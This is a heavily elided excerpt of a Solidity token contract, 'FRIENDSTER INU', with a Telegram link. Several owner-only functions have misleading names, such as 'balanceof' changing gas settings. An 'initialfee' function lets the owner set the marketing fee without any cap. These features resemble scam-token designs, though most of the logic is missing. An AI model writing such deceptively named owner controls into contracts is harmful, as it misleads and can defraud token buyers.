...
Telegram: https://t.me/friendsterinu
...
contract FRIENDSTERINU is Context, Ownable {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    string _name = "FRIENDSTER INU";
    string _symbol = "FRINU";
    uint8 _decimals = 9;
    ...
    function Graveson(address account) external onlyOwner {
   ...
   function getGasMaxLimit(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
    ...
    function initialfee(uint8 value) external onlyOwner{
        _marketingFee = value;
    }

    function balanceof(uint256 newValue) external onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "Processing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Cannot update gasForProcessing to same value");
        gasForProcessing = newValue;
    }

    function constructionReset(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "ClaimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "Cannot update claimWait to same value");
        claimWait = newClaimWait;
    }

    function reducedata(uint256 iSupply) private pure returns(uint256, uint256) {
    ...
    function removefee(address account, uint256 amounts) internal {
